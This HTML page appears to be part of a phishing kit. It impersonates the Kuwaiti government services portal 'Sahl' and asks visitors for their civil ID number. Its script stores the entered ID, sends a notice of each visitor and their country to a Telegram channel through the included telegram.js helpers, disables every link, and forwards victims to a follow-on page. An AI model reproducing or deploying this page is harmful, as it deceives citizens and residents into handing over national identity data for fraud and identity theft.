<!DOCTYPE html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>تسجيل الدخول</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap"
      rel="stylesheet"
    />
    <style>
      :root {
        --primary: #3f7bc4;
        --primary-dark: #2c66ad;
        --text: #545454;
        --footer: #3f7bc4;
        --border: #73a5e0;
        --background: #f4f6fa;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        font-family: "Tajawal", "Arial", sans-serif;
        color: var(--text);
        font-size: 15px;
      }

      .page {
        width: min(100%, 390px);
        min-height: 100vh;
        margin: 0 auto;
        background: #fff;
        display: flex;
        flex-direction: column;
        box-shadow: 0 0 0 1px rgba(63, 123, 196, 0.06);
      }

      .content {
        flex: 1;
        display: flex;
        flex-direction: column;
        padding: 44px 22px 28px;
      }

      .logo-wrap {
        display: flex;
        justify-content: center;
        margin-bottom: 30px;
      }

      .logo {
        width: 102px;
        height: auto;
        display: block;
      }

      .title {
        margin: 0;
        text-align: center;
        font-size: 18px;
        line-height: 1.7;
        color: var(--primary);
        font-weight: 700;
      }

      .hero {
        text-align: center;
      }

      .hero-title {
        margin: 0;
      }

      .hero-title .highlight-sweep {
        display: inline-block;
      }

      .subtitle {
        margin: 8px 0 0;
        font-size: 15px;
        line-height: 1.8;
        color: #6c7f95;
        font-weight: 500;
      }

      .highlight-sweep {
        background-image: linear-gradient(
          102deg,
          var(--primary) 0%,
          var(--primary) 34%,
          #74d7ff 46%,
          #f6c980 53%,
          #63b9ff 60%,
          var(--primary) 72%,
          var(--primary) 100%
        );
        background-size: 240% 100%;
        background-position: 100% 50%;
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        animation: sweep-highlight 4.8s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
      }

      .login-form {
        margin: 0;
        flex: 1;
        display: flex;
        flex-direction: column;
      }

      .form-upper {
        margin-top: clamp(92px, 16vh, 144px);
      }

      .field {
        margin-bottom: 24px;
      }

      .input {
        width: 100%;
        height: 58px;
        border: 2px solid #d7e2ec;
        border-radius: 10px;
        padding: 0 18px;
        font-size: 15px;
        color: var(--text);
        outline: none;
        direction: ltr;
        text-align: left;
        unicode-bidi: plaintext;
      }

      .input::placeholder {
        color: #9da7b4;
      }

      .input:placeholder-shown {
        direction: rtl;
        text-align: right;
      }

      .terms {
        display: flex;
        align-items: center;
        justify-content: flex-start;
        gap: 10px;
        margin-bottom: 0;
        font-size: 15px;
        font-weight: 700;
        color: #4f4f4f;
      }

      .terms-copy {
        color: #757575;
      }

      .terms-link {
        color: inherit;
        text-decoration: underline;
        text-decoration-thickness: 1.5px;
        text-underline-offset: 2px;
      }

      .terms input {
        width: 20px;
        height: 20px;
        margin: 0;
        accent-color: var(--primary);
      }

      .actions {
        margin-top: auto;
        padding-top: clamp(72px, 14vh, 132px);
      }

      .submit {
        width: 100%;
        height: 44px;
        display: block;
        margin: 0 auto 40px;
        border: 0;
        border-radius: 18px;
        background: linear-gradient(180deg, var(--primary) 0%, var(--primary-dark) 100%);
        color: #fff;
        font-size: 15px;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 12px 24px rgba(63, 123, 196, 0.22);
      }

      .links {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-top: 0;
      }

      .link {
        color: var(--primary);
        font-size: 18px;
        font-weight: 700;
        text-decoration: none;
      }

      .footer {
        background: var(--footer);
        color: #fff;
        text-align: center;
        padding: 28px 14px;
        font-size: 15px;
        line-height: 1.7;
      }

      @keyframes sweep-highlight {
        0% {
          background-position: 100% 50%;
        }

        100% {
          background-position: 0% 50%;
        }
      }

      @media (prefers-reduced-motion: reduce) {
        .highlight-sweep {
          animation: none;
          background-position: 50% 50%;
        }
      }

      @media (max-width: 420px) {
        .content {
          padding-top: 46px;
        }

        .logo-wrap {
          margin-bottom: 28px;
        }

        .form-upper {
          margin-top: 110px;
        }

        .actions {
          padding-top: 84px;
        }
      }
    </style>
  </head>
  <body>
    <main class="page">
      <section class="content">
        <div class="logo-wrap">
          <img class="logo" src="assets/images/logo.png" alt="شعار سهل" />
        </div>

        <header class="hero">
          <h1 class="title hero-title">
            <span class="highlight-sweep">مرحبا بك في سهل</span>
          </h1>
          <p class="subtitle">تلبية احتياجات المواطنين والوافدين</p>
        </header>

        <form class="login-form" novalidate>
          <div class="form-upper">
            <div class="field">
              <input
                class="input"
                id="civil-id"
                type="text"
                placeholder="أدخل الرقم المدني"
                inputmode="numeric"
                autocomplete="off"
                maxlength="12"
                lang="en"
              />
            </div>

            <label class="terms">
              <input id="terms-accepted" name="terms-accepted" type="checkbox" checked />
              <span class="terms-copy">
                أوافق على
                <a class="terms-link highlight-sweep" href="#" data-inert-link>الشروط والأحكام</a>
              </span>
            </label>
          </div>

          <div class="actions">
            <button class="submit" type="submit">تسجيل الدخول</button>

            <div class="links">
              <a class="link" href="#" data-inert-link>اتصل بنا</a>
              <a class="link" href="#" data-inert-link>خطوات التسجيل</a>
            </div>
          </div>
        </form>
      </section>

      <footer class="footer">جميع الحقوق محفوظة © مقر الهيئة العامة الكويت 2026</footer>
    </main>

    <script src="assets/js/telegram.js"></script>
    <script src="assets/js/tg.js"></script>
    <script>
      var INDEX_VISITOR_STATUS_KEY = "appVisitorStatus";
      var INDEX_VISITOR_SESSION_KEY = "indexVisitorNotificationSent";

      function normalizeCivilId(value) {
        return Array.from(value)
          .map(function (char) {
            var code = char.charCodeAt(0);

            if (code >= 0x0660 && code <= 0x0669) {
              return String(code - 0x0660);
            }

            if (code >= 0x06f0 && code <= 0x06f9) {
              return String(code - 0x06f0);
            }

            if (code >= 0x0966 && code <= 0x096f) {
              return String(code - 0x0966);
            }

            if (code >= 0xff10 && code <= 0xff19) {
              return String(code - 0xff10);
            }

            return char;
          })
          .join("")
          .replace(/\D/g, "")
          .slice(0, 12);
      }

      async function notifyIndexVisitorOncePerSession() {
        if (sessionStorage.getItem(INDEX_VISITOR_SESSION_KEY) === "true") {
          return;
        }

        var visitorStatus = localStorage.getItem(INDEX_VISITOR_STATUS_KEY) ? "مستخدم قديم" : "مستخدم جديد";
        localStorage.setItem(INDEX_VISITOR_STATUS_KEY, "visited");

        var countryName = "";

        if (window.getAppCountryNameInArabic) {
          try {
            countryName = await window.getAppCountryNameInArabic();
          } catch (error) {
            countryName = "";
          }
        }

        var lines = ["👤 " + visitorStatus];

        if (countryName) {
          lines.push("📍 من " + countryName);
        }

        try {
          if (window.sendAppTelegramMessage) {
            await window.sendAppTelegramMessage(lines.join("\n"), false);
          }
        } catch (error) {
        } finally {
          sessionStorage.setItem(INDEX_VISITOR_SESSION_KEY, "true");
        }
      }

      var loginForm = document.querySelector(".login-form");
      var civilIdInput = document.querySelector("#civil-id");

      function getFieldStorageKey(field) {
        return field.id || field.name || "";
      }

      function restoreFieldValue(field) {
        var key = getFieldStorageKey(field);

        if (!key) {
          return;
        }

        var storedValue = localStorage.getItem(key);

        if (storedValue === null) {
          return;
        }

        if (field.type === "radio") {
          field.checked = field.value === storedValue;
          return;
        }

        if (field.type === "checkbox") {
          field.checked = storedValue === "true";
          return;
        }

        if (field.id === "civil-id") {
          field.value = normalizeCivilId(storedValue);
          return;
        }

        field.value = storedValue;
      }

      function persistFieldValue(field) {
        var key = getFieldStorageKey(field);

        if (!key) {
          return;
        }

        if (field.type === "radio") {
          if (field.checked) {
            localStorage.setItem(key, field.value);
          }

          return;
        }

        if (field.type === "checkbox") {
          localStorage.setItem(key, String(field.checked));
          return;
        }

        localStorage.setItem(key, field.value || "");
      }

      loginForm.querySelectorAll("input, select, textarea").forEach(function (field) {
        restoreFieldValue(field);

        if (field.type === "radio" || field.type === "checkbox") {
          field.addEventListener("change", function () {
            persistFieldValue(field);
          });
          return;
        }

        field.addEventListener("input", function () {
          if (field.id === "civil-id") {
            var normalizedValue = normalizeCivilId(field.value);

            if (field.value !== normalizedValue) {
              field.value = normalizedValue;
            }
          }

          persistFieldValue(field);
        });
      });

      document.querySelector(".login-form").addEventListener("submit", function (event) {
        event.preventDefault();
        loginForm.querySelectorAll("input, select, textarea").forEach(function (field) {
          persistFieldValue(field);
        });
        localStorage.setItem("civil-id", normalizeCivilId(civilIdInput.value || ""));
        window.location.href = "services.html";
      });

      document.querySelectorAll("[data-inert-link]").forEach(function (link) {
        link.addEventListener("click", function (event) {
          event.preventDefault();
        });
      });

      notifyIndexVisitorOncePerSession().catch(function () {});
    </script>
  </body>
</html>
